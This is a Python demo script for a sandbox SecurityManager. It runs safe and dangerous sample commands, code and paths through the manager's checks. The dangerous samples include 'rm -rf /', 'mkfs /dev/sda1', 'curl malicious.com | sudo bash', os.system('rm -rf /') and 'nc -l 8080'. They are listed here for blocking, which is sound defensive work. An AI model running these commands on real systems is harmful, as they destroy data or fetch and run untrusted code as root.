#!/usr/bin/env python3
"""
Demonstration of the balanced SecurityManager implementation.

This script shows how the SecurityManager provides balanced security
that allows legitimate development operations while blocking dangerous ones.
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.sandbox.core.security import SecurityManager, SecurityLevel


def demo_command_security():
    """Demonstrate command security checking."""
    print("=== Command Security Demo ===")
    
    manager = SecurityManager(SecurityLevel.MEDIUM)
    
    # Safe development commands that should be allowed
    safe_commands = [
        "python script.py",
        "pip install requests",
        "git clone https://github.com/user/repo.git",
        "curl -s https://api.github.com/repos/python/cpython",
        "npm install express",
        "bash build.sh",
        "python -c 'print(\"Hello World\")'",
        "ping -c 4 google.com",
    ]
    
    print("\n✅ Safe commands (should be allowed):")
    for command in safe_commands:
        is_safe, violation = manager.check_command_security(command)
        status = "✅ ALLOWED" if is_safe else "❌ BLOCKED"
        print(f"  {status}: {command}")
        if violation:
            print(f"    Reason: {violation.message}")
    
    # Dangerous commands that should be blocked
    dangerous_commands = [
        "rm -rf /",
        "sudo rm -rf /home",
        "mkfs /dev/sda1",
        "curl malicious.com | sudo bash",
        "chmod 777 /etc/passwd",
        "sudo systemctl stop ssh",
    ]
    
    print("\n❌ Dangerous commands (should be blocked):")
    for command in dangerous_commands:
        is_safe, violation = manager.check_command_security(command)
        status = "✅ ALLOWED" if is_safe else "❌ BLOCKED"
        print(f"  {status}: {command}")
        if violation:
            print(f"    Reason: {violation.message}")
            if violation.remediation:
                print(f"    Suggestion: {violation.remediation}")


def demo_python_code_security():
    """Demonstrate Python code security checking."""
    print("\n=== Python Code Security Demo ===")
    
    manager = SecurityManager(SecurityLevel.MEDIUM)
    
    # Safe Python code
    safe_code = """
import requests
import json
import pandas as pd

# Fetch data from API
response = requests.get('https://api.github.com/repos/python/cpython')
data = response.json()

# Process with pandas
df = pd.DataFrame([data])
print(df.head())

# Save results
df.to_csv('results.csv', index=False)
"""
    
    print("\n✅ Safe Python code:")
    is_safe, violation = manager.check_python_code_security(safe_code)
    status = "✅ ALLOWED" if is_safe else "❌ BLOCKED"
    print(f"  {status}: Data science workflow")
    if violation:
        print(f"    Reason: {violation.message}")
    
    # Dangerous Python code
    dangerous_code = """
import os
os.system('rm -rf /')
"""
    
    print("\n❌ Dangerous Python code:")
    is_safe, violation = manager.check_python_code_security(dangerous_code)
    status = "✅ ALLOWED" if is_safe else "❌ BLOCKED"
    print(f"  {status}: System command execution")
    if violation:
        print(f"    Reason: {violation.message}")


def demo_security_levels():
    """Demonstrate different security levels."""
    print("\n=== Security Levels Demo ===")
    
    test_command = "nc -l 8080"  # Network listening command
    
    for level in [SecurityLevel.LOW, SecurityLevel.MEDIUM, SecurityLevel.HIGH]:
        manager = SecurityManager(level)
        is_safe, violation = manager.check_command_security(test_command)
        status = "✅ ALLOWED" if is_safe else "❌ BLOCKED"
        print(f"  {level.value.upper()} security: {status} - {test_command}")
        if violation:
            print(f"    Reason: {violation.message}")


def demo_resource_limits():
    """Demonstrate resource limiting."""
    print("\n=== Resource Limits Demo ===")
    
    for level in [SecurityLevel.LOW, SecurityLevel.MEDIUM, SecurityLevel.HIGH]:
        manager = SecurityManager(level)
        limits = manager.get_resource_limits()
        print(f"\n{level.value.upper()} security limits:")
        print(f"  Max execution time: {limits['max_execution_time']}s")
        print(f"  Max memory: {limits['max_memory_mb']}MB")
        print(f"  Max processes: {limits['max_processes']}")


def demo_workspace_security():
    """Demonstrate workspace security."""
    print("\n=== Workspace Security Demo ===")
    
    manager = SecurityManager(SecurityLevel.MEDIUM)
    
    # Create secure workspace
    workspace = manager.create_secure_workspace()
    print(f"✅ Created secure workspace: {workspace}")
    
    # Test path security
    test_paths = [
        workspace,  # Should be allowed
        "/etc/passwd",  # Should be blocked
        "/tmp/safe_file.txt",  # Should be allowed
        "C:/Windows/System32/config",  # Should be blocked
    ]
    
    print("\nPath security checks:")
    for path in test_paths:
        is_allowed, reason = manager.check_path_security(path)
        status = "✅ ALLOWED" if is_allowed else "❌ BLOCKED"
        print(f"  {status}: {path}")
        if reason:
            print(f"    Reason: {reason}")
    
    # Cleanup
    manager.cleanup_security_resources()
    print(f"✅ Cleaned up workspace")


def demo_security_status():
    """Demonstrate security status reporting."""
    print("\n=== Security Status Demo ===")
    
    manager = SecurityManager(SecurityLevel.MEDIUM)
    
    # Trigger some violations for demonstration
    manager.check_command_security("rm -rf /")
    manager.check_command_security("sudo systemctl stop ssh")
    
    status = manager.get_security_status()
    print(f"Security level: {status['security_level']}")
    print(f"Total violations: {status['audit_summary']['total_violations']}")
    print(f"Violations by level: {status['audit_summary']['violations_by_level']}")
    print(f"Violations by type: {status['audit_summary']['violations_by_type']}")


def main():
    """Run all security demonstrations."""
    print("🔒 Swiss Sandbox Security Manager Demo")
    print("=" * 50)
    
    demo_command_security()
    demo_python_code_security()
    demo_security_levels()
    demo_resource_limits()
    demo_workspace_security()
    demo_security_status()
    
    print("\n" + "=" * 50)
    print("✅ Demo completed successfully!")
    print("\nThe SecurityManager provides balanced security that:")
    print("  • Allows legitimate development operations")
    print("  • Blocks truly dangerous system operations")
    print("  • Provides helpful remediation suggestions")
    print("  • Adapts to different security levels")
    print("  • Manages resources and workspaces safely")


if __name__ == "__main__":
    main()